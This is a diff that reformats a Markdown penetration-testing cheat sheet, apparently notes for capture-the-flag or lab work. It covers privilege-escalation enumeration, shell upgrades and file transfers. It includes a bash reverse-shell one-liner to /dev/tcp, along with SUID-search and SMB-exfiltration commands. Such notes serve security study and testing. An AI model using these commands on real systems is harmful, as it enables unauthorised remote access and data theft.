@@ -73,22 +73,22 @@ Find all SUID/SGID bit sets on machine
 `find . -name flag1.txt` : find the file named "flag1.txt" in current directory
 
 `-find`
-	`-name`
-	`-perm a=x` finds executables
-	`-user [user]` finds files for a certain user
-	`-writeable -type d 2>/dev/null` find world-writeable folders
-	`-perm -222 -type d 2>/dev/null` find world-writeable folders
-	`-perm -o w -type d 2>/dev/null` find world-writeable folders
-	`-type`
-		`-d` is directory
-		`-f` is file
-		`-f perm 0777` find files with the 777 permissions
-	-Other stuff:
-		`find / -group [group] 2>/dev/null` to find binaries within a group that your user has permissions for
-		`find / -writable -type d 2>/dev/null` find writeable folders (`writable` is spelled wrong here)
-	Find all SUID/SGID bit sets on machine
-		- `find / -type f -perm -04000 -ls 2>/dev/null`
-		- Another example: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
+- `-name`
+- `-perm a=x` finds executables
+- `-user [user]` finds files for a certain user
+- `-writeable -type d 2>/dev/null` find world-writeable folders
+- `-perm -222 -type d 2>/dev/null` find world-writeable folders
+- `-perm -o w -type d 2>/dev/null` find world-writeable folders
+- `-type`
+	- `-d` is directory
+	- `-f` is file
+	- `-f perm 0777` find files with the 777 permissions
+- -Other stuff:
+	- `find / -group [group] 2>/dev/null` to find binaries within a group that your user has permissions for
+	- `find / -writable -type d 2>/dev/null` find writeable folders (`writable` is spelled wrong here)
+- Find all SUID/SGID bit sets on machine
+	- `find / -type f -perm -04000 -ls 2>/dev/null`
+	- Another example: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
 
 # Shell Upgrade
 
@@ -100,10 +100,10 @@ from VIM
 or `:set shell=/bin/sh` and then `:shell` from inside vim
 
 With some kind of application command execution (SQL, etc)
-`bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`
-	set up a listened with port 443
-		Then continue with python one above
-		won't work if shell dies too quickly
+- `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`
+- set up a listened with port 443
+- Then continue with python one above
+	- won't work if shell dies too quickly
 
 # File Transfers
 
@@ -128,11 +128,10 @@ additionally, instead of supplying an out file, you can execute files by piping 
 
 `php -S [IP:port]`
 
-Impacket smbserver
-`smbserver.py`
-	- `impacket-smbserver -smb2support CompData [directory for server location]`
-	- `CompData` is the name that the target will use to refer to the share.
-	- To transfer from target (windows example): `move [file] \\[host-IP]\CompData`
+Impacket smbserver `smbserver.py`
+- `impacket-smbserver -smb2support CompData [directory for server location]`
+- `CompData` is the name that the target will use to refer to the share.
+- To transfer from target (windows example): `move [file] \\[host-IP]\CompData`
 
 
 ### File Transfers with Code
@@ -190,8 +189,8 @@ PATH is an environment variable in Linux that tells the operating system where t
 Capabilities are a method that administrators can use to increase privilege level of a process or binary.
 
 `Get-cap` to list enabled capabilities
-	- `Get-cap -r / 2>/dev/null`  will redirect error messages to /dev/null (there will be a lot of error messages)
-	- This will return all files with capabilities, view GTFO bins for further exploitation
+- `Get-cap -r / 2>/dev/null`  will redirect error messages to /dev/null (there will be a lot of error messages)
+- This will return all files with capabilities, view GTFO bins for further exploitation
 
 
 # Weak File Permissions
